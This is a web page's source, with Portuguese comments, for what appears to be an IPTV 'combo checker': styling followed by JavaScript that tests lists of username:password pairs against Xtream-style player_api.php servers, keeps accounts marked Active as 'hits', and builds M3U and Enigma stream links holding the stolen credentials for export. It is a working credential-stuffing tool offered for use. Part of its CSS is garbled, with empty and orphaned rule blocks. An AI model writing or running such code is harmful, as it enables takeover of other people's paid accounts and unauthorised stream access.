  /* ==== VARI√ÅVEIS DE TEMA - TEMA ESCURO + RAIOS ==== */
  :root {
    --bg-color: #0a0a12;
    --bg-gradient: linear-gradient(135deg, #0a0a12 40%, #1a1a27 100%);
    --text-color: #e0e0ff;
    --accent-color: #63e6be;
    --accent-color-light: #a2fff0;
    --error-color: #ff5555;
    --success-color: #49d49d;
    --shadow-color: rgba(0, 200, 255, 0.6);
    --progress-bg: #222;
    --progress-fill: #00ffaa;
    --btn-bg: #12131f;
    --btn-hover-bg: #184846;
    --input-bg: #12131f;
    --input-border: #484848;
    --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  
  /* Reset e estilos base */
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }
  
  body {
    margin: 0; 
    padding: 0;
    background: var(--bg-gradient);
    color: var(--text-color);
    font-family: var(--font-family);
    min-height: 100vh;
    overflow-x: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 100%;
  }
  
  /* ===== FUNDO RAIOS ANIMADOS ===== */
  .lightning {
    position: fixed;
    top: 0; 
    left: 0; 
    width: 100vw; 
    height: 100vh;
    pointer-events: none;
    z-index: 0;
    overflow: visible;
  }
  
  .lightning span {
    position: absolute;
    width: 2px; 
    height: 120px;
    background: linear-gradient(180deg, rgba(0,255,255,0.75), transparent);
    filter: drop-shadow(0 0 8px #00fff0);
    opacity: 0;
    animation: lightningAnim 3s linear infinite;
  }
  
  .lightning span:nth-child(1) { left: 10%; animation-delay: 0s; }
  .lightning span:nth-child(2) { left: 25%; animation-delay: 0.8s; }
  .lightning span:nth-child(3) { left: 40%; animation-delay: 1.5s; }
  .lightning span:nth-child(4) { left: 60%; animation-delay: 2.1s; }
  .lightning span:nth-child(5) { left: 75%; animation-delay: 2.7s; }
  
  @keyframes lightningAnim {
    0%, 80%, 100% { opacity: 0; transform: translateY(0); }
    85%, 95% { opacity: 1; transform: translateY(10px); }
  }
  
  /* ===== T√çTULO ANIMADO ===== */
  header {
    margin-top: 20px;
    margin-bottom: 15px;
    font-size: clamp(1.5rem, 5vw, 2.6rem);
    font-weight: 900;
    color: var(--accent-color);
    text-align: center;
    position: relative;
    user-select: none;
    min-height: 3rem;
    width: 100%;
    padding: 0 10px;
  }
  
  /* Typing effect */
  @keyframes typing {
    from { width: 0 }
    to { width: 100% }
  }
  
  @keyframes blinkCaret {
    50% { border-color: transparent; }
  }
  
  .typing {
    white-space: nowrap;
    overflow: hidden;
    border-right: 3px solid var(--accent-color);
    animation:
      typing 3s steps(15, end) forwards,
      blinkCaret 0.8s step-end infinite;
    width: 0;
    margin: 0 auto;
  }
  
  /* Flicker effect */
  @keyframes flicker {
    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
      opacity: 1;
      text-shadow:
        0 0 7px var(--accent-color),
        0 0 20px var(--accent-color-light),
        0 0 30px var(--accent-color-light);
    }
    20%, 22%, 24%, 55% {
      opacity: 0.7;
      text-shadow: none;
    }
  }
  
  header.flicker {
    animation: flicker 3s linear infinite;
  }
  
  /* ===== CONTAINER CENTRAL ===== */
  main {
    width: 95%;
    max-width: 900px;
    background: rgba(10,10,18,0.85);
    box-shadow: 0 0 20px var(--shadow-color);
    border-radius: 10px;
    padding: 15px;
    margin-bottom: 20px;
    z-index: 1;
    flex: 1;
    display: flex;
    flex-direction: column;
  }
  
  /* ===== FORMUL√ÅRIO ===== */
  form {
    display: grid;
    grid-template-columns: 1fr;
    gap: 12px;
    align-items: center;
    margin-bottom: 15px;
  }
  
  /* ==== BOT√ïES ==== */
  button {
    background-color: var(--btn-bg);
    border: none;
    border-radius: 6px;
    padding: 12px 18px;
    color: var(--accent-color);
    font-weight: 700;
    font-size: 1rem;
    cursor: pointer;
    transition: background-color 0.25s ease, box-shadow 0.25s ease;
    box-shadow: 0 0 5px transparent;
    width: 100%;
    height: 44px;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  
  button:hover:not(:disabled) {
    background-color: var(--btn-hover-bg);
    box-shadow: 0 0 12px var(--accent-color);
  }
  
  button:disabled {
    color: #777;
    cursor: not-allowed;
    box-shadow: none;
  }
  
  /* ===== ESTAT√çSTICAS ===== */
  .stats {
    display: flex;
    justify-content: center;
    gap: 10px;
    margin-bottom: 20px;
  }
  
  .stat-item {
    background: #112;
    padding: 8px 12px;
    border-radius: 8px;
    min-width: 100px;
    text-align: center;
    color: var(--accent-color-light);
    font-weight: 600;
    font-size: 0.85rem;
    user-select: none;
    box-shadow: 0 0 10px transparent;
    transition: box-shadow 0.3s ease;
  }
  
  .stat-item.hit {
    color: var(--success-color);
    box-shadow: 0 0 12px var(--success-color);
  }
  
  .stat-item.tested {
    color: var(--accent-color-light);
    box-shadow: 0 0 12px var(--accent-color);
  }
  
  /* ===== RESULTADOS ===== */
  .results-container {
    max-height: 300px;
    overflow-y: auto;
    background: #121522ee;
    border-radius: 12px;
    padding: 12px;
    font-family: monospace;
    font-size: 0.8rem;
    color: #a0f0ff;
    user-select: text;
    box-shadow: inset 0 0 8px #00ffeeb5;
    flex: 1;
    min-height: 150px;
  }
  
  /* Cada hit */
  .hit-item {
    background: #002633cc;
    border-radius: 10px;
    margin-bottom: 12px;
    padding: 10px;
    box-shadow: 0 0 10px #00ffff55;
    position: relative;
    transition: background-color 0.3s ease;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  
  .hit-item:hover {
    background: #005564cc;
  }
  
  .hit-content {
    flex-grow: 1;
    margin-right: 10px;
  }
  
  /* Bot√µes do hit */
  .hit-actions {
    display: flex;
    gap: 5px;
  }
  
  .hit-actions button {
    background: transparent;
    border: none;
    color: var(--accent-color-light);
    font-size: 1rem;
    cursor: pointer;
    transition: color 0.3s ease;
    padding: 2px 6px;
    border-radius: 6px;
    width: auto;
    height: auto;
  }
  
  .hit-actions button:hover {
    color: var(--success-color);
  }
  
  /* BOT√ïES GERAIS DE CONTROLE */
  .controls {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 10px;
    margin-top: 15px;
  }
  
  /* NOTIFICA√á√ÉO */
  #notification {
    position: fixed;
    bottom: 25px;
    left: 50%;
    transform: translateX(-50%);
    background: var(--accent-color);
    padding: 12px 20px;
    border-radius: 8px;
    box-shadow: 0 0 20px var(--accent-color-light);
    color: #021212;
    font-weight: 700;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.5s ease;
    z-index: 1000;
    user-select: none;
    max-width: 90%;
    text-align: center;
    font-size: 0.9rem;
  }
  
  #notification.show {
    opacity: 1;
    pointer-events: auto;
  }
  
  /* Rodap√© */
  footer {
    width: 100%;
    text-align: center;
    padding: 15px 0;
    color: var(--accent-color-light);
    font-size: 0.9rem;
    font-weight: 600;
    margin-top: auto;
    z-index: 1;
  }
  
  /* Espa√ßo para an√∫ncios */
  .ad-container {
    width: 100%;
    max-width: 728px;
    margin: 20px auto;
    text-align: center;
    background: rgba(0, 0, 0, 0.3);
    border-radius: 8px;
    padding: 10px;
    min-height: 90px;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  
  .ad-placeholder {
    color: #777;
    font-style: italic;
  }
  
  /* RESPONSIVO */
  @media (min-width: 601px) {
    .controls {

    }

    }

      font-size: 0.88rem;
    }

    }

      font-size: 0.75rem;
    }

      margin-top: 15px;
      margin-bottom: 10px;
    }
  }
</style>

  // ===== FUN√á√ÉO PRINCIPAL DE TESTE DE COMBO =====
  async function testCombo(host, username, password, attempt = 0) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000); // Timeout aumentado para 20s
    
    // Garantir que o host tenha o prefixo http://
    let formattedHost = host;
    if (!host.startsWith('http://') && !host.startsWith('https://')) {
      formattedHost = 'http://' + host;
    }
    
    // URL base da API
    const baseUrl = `${formattedHost}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
    const userInfoUrl = `${baseUrl}&action=get_user_info`;
    
    try {
      // Usar nosso proxy local
      const proxyUrl = `/api/proxy?url=${encodeURIComponent(userInfoUrl)}`;
      
      // Fazer requisi√ß√£o para obter informa√ß√µes do usu√°rio
      const userInfoResponse = await fetch(proxyUrl, {
        signal: controller.signal,
        headers: { 
          'Accept': 'application/json',
          'X-Requested-With': 'XMLHttpRequest'
        },
        cache: 'no-store'
      });
      
      clearTimeout(timeoutId);
      
      // Verificar se a resposta foi bem-sucedida
      if (!userInfoResponse.ok) {
        throw new Error(`HTTP error! status: ${userInfoResponse.status}`);
      }
      
      // Parsear os dados
      const userInfo = await userInfoResponse.json();
      
      // Verificar se o usu√°rio est√° ativo
      if (userInfo && userInfo.user_info && userInfo.user_info.status === 'Active') {
        const expirationDate = userInfo.user_info.exp_date ?
          new Date(parseInt(userInfo.user_info.exp_date) * 1000).toLocaleDateString('pt-BR') :
          'Desconhecida';
          
        return {
          valid: true,
          username,
          password,
          host: formattedHost,
          status: userInfo.user_info.status,
          expiration: expirationDate,
          created_at: userInfo.user_info.created_at || '',
          maxConnections: userInfo.user_info.max_connections || 'Desconhecido',
          m3uLink: `${formattedHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
          m3uPlusLink: `${formattedHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
          enigmaLink: `${formattedHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=enigma`,
          epgUrl: `${formattedHost}/epg.xml`, // supondo padr√£o
          data: userInfo
        };
      } else {
        return { valid: false };
      }
    } catch (error) {
      clearTimeout(timeoutId);
      // Retry inteligente para erros transit√≥rios
      if (attempt < MAX_RETRIES && !stopRequested) {
        await delay(500);
        return testCombo(host, username, password, attempt + 1);
      }
      return { valid: false, error: error.message || 'Erro desconhecido' };
    }
  }
  
  // ===== FUN√á√ÉO PARA COPIAR TEXTO COM FALLBACK =====
  function copyToClipboard(text) {
    return new Promise((resolve, reject) => {
      // Tentar usar a API moderna do clipboard
      if (navigator.clipboard) {
        navigator.clipboard.writeText(text)
          .then(() => resolve(true))
          .catch(err => {
            console.error('Erro ao copiar com API moderna:', err);
            // Fallback para m√©todo antigo
            fallbackCopyTextToClipboard(text, resolve, reject);
          });
      } else {
        // Usar m√©todo antigo diretamente se a API n√£o estiver dispon√≠vel
        fallbackCopyTextToClipboard(text, resolve, reject);
      }
    });
  }
  
  // ===== M√âTODO ANTIGO DE COPIA (FALLBACK) =====
  function fallbackCopyTextToClipboard(text, resolve, reject) {
    const textArea = document.createElement("textarea");
    textArea.value = text;
    
    // Evitar rolagem para o elemento
    textArea.style.position = "fixed";
    textArea.style.top = 0;
    textArea.style.left = 0;
    textArea.style.width = "2em";
    textArea.style.height = "2em";
    textArea.style.padding = 0;
    textArea.style.border = "none";
    textArea.style.outline = "none";
    textArea.style.boxShadow = "none";
    textArea.style.background = "transparent";
    textArea.style.opacity = "0";
    
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    
    try {
      const successful = document.execCommand('copy');
      document.body.removeChild(textArea);
      
      if (successful) {
        resolve(true);
      } else {
        reject(new Error('N√£o foi poss√≠vel copiar o texto'));
      }
    } catch (err) {
      document.body.removeChild(textArea);
      reject(err);
    }
  }

  // ===== INICIA O ESCANEAMENTO =====
  async function startScan() {
    // Reseta estado
    stopRequested = false;
    totalHits = 0;
    totalTested = 0;
    resultsHits = [];
    resultsSet.clear();
    resultsContainer.innerHTML = '';
    updateStats();
    
    // Verifica se h√° combos carregados
    if(combos.length === 0) {
      // Tenta carregar online
      const loaded = await loadCombosOnline();
      if (!loaded) return;
    }
    
    generateBtn.disabled = true;
    stopBtn.disabled = false;
    exportBtn.disabled = true;
    copyAllBtn.disabled = true;
    
    // Limitar o n√∫mero de combos para processar
    const maxCombos = Math.min(100, combos.length);
    const combosToProcess = combos.slice(0, maxCombos);
    
    // Processar cada combo sequencialmente
    for (const combo of combosToProcess) {
      if (stopRequested) break;
      
      // Quebra username e password conforme padr√£o "username:password"
      let [username, password] = combo.split(':');
      if(!username || !password) {
        continue;
      }
      
      // Testa em todos os servidores
      for (const server of servers) {
        if (stopRequested) break;
        
        try {
          totalTested++;
          updateStats();
          
          const res = await testCombo(server, username, password);
          if (res.valid) {
            // Evitar duplicidade: combo + host como chave √∫nica
            const uniqueKey = `${server}|${username}|${password}`;
            if(!resultsSet.has(uniqueKey)) {
              resultsSet.add(uniqueKey);
              totalHits++;
              resultsHits.push(res);
              
              // Limitar a exibi√ß√£o a 10 hits
              if (resultsContainer.children.length < 10) {
                // Renderizar na UI
                const hitHTML = renderHit(res, totalHits);
                resultsContainer.appendChild(hitHTML);
              }
              
              // Atualiza estat√≠sticas
              updateStats();
            }
            // Se encontrou um hit v√°lido, n√£o precisa testar nos outros servidores
            break;
          }
        } catch (e) {
          // Ignora erros
        }
        
        // Delay entre requisi√ß√µes
        await delay(100);
      }
    }
    
    // Finalizado
    generateBtn.disabled = false;
    stopBtn.disabled = true;
    exportBtn.disabled = resultsHits.length === 0;
    copyAllBtn.disabled = resultsHits.length === 0;
    showNotification(`Gera√ß√£o M3U finalizada! Links encontrados: ${totalHits} de ${totalTested} testados`, 7000);
  }
